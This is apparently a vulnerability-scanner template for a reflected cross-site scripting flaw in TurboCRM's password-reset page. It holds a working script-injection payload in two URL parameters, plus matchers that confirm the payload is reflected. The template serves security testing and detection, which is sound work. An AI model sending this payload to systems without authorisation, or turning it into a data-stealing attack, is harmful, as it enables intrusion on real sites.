id: turbocrm-xss

info:
  name: TurboCRM XSS
  author: pikpikcu
  severity: medium
  reference: https://gist.github.com/pikpikcu/9689c5220abbe04d4927ffa660241b4a
  tags: xss,turbocrm

requests:
  - method: GET
    path:
      - '{{BaseURL}}/login/forgetpswd.php?loginsys=1&orgcode=%22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E&loginname=%22%3E%3Cscript%3Ealert(/XSS/)%3C/script%3E'

    matchers-condition: and
    matchers:

      - type: word
        words:
          - '"><script>alert(/XSS/)</script>'
        part: body

      - type: status
        status:
          - 200
